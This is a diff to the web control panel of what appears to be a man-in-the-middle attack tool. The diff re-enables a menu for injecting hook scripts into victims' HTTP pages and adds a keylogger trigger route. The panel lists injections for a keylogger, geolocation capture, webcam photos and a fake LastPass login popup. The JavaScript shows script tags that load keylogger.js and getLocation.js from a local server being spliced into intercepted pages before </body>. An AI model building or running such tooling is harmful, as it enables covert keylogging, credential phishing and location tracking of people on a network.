@@ -73,7 +73,7 @@
           <h4>Block URLs</h4>
           <small>If url is in whitelist (currently hardcoded), the client will be blocked. This cant handle HTTPS/HSTS</small>
         </li>
-        <!-- <li class="list-group-item list-group-item-toggle dropdown-toggle" aria-expanded="false">
+        <li class="list-group-item list-group-item-toggle dropdown-toggle" aria-expanded="false">
           <a data-toggle="collapse" href="#collapseInject" aria-expanded="true" data-toggle="dropdown" aria-controls="collapseInject"><h4>Inject Hook in HTTP <span class="caret"></span></h4>
           <small>Array of scripts that can be injected into the clients page</small>
           </a>
@@ -91,7 +91,7 @@
               <small>Inject a keylogger into the page.</small>
             </li>
 
-            <li class="list-group-item">
+            <!-- <li class="list-group-item">
               <div class="onoffswitch">
                 <input type="checkbox" name="takePhoto" class="onoffswitch-checkbox" id="takePhoto">
                 <label class="onoffswitch-label" for="takePhoto">
@@ -136,8 +136,8 @@
             </div>
             <h4>Request Lastpass Login</h4>
             <small>Pop up a lastpass login on the user's screen</small>
-          </li>
-          </ul>-->
+          </li> -->
+          </ul>
 
         <li class="list-group-item">
         <div class="onoffswitch">
@@ -222,10 +222,12 @@
     $.get( "/TriggerBlocks", function ( data ) { console.log('Blocking: ', data); } );
   });
   $("#triggerWolfPack").click( function () {
-    $.get( "/TriggerWolfPack", function ( data ) { console.log('Wolf-pack: ', data); } );
+    $.get( "/TriggerWolfPack", function ( data ) { } );
   });
 
-
+  $("#keylogger").click(function() {
+    $.get( "/TriggerInjection?trigger=keylogger", function ( data ) { } );
+  })
 
 
 
@@ -269,10 +271,10 @@
   //   $.get( "/BlockWebsites", function( data ) {
   //   });
   // })
-  $("#keylogger").click(function() {
-    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Fkeylogger.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-    });
-  })
+  // $("#keylogger").click(function() {
+  //   $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Fkeylogger.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
+  //   });
+  // })
  $("#getLocation").click(function() {
     $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FgetLocation.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
     });
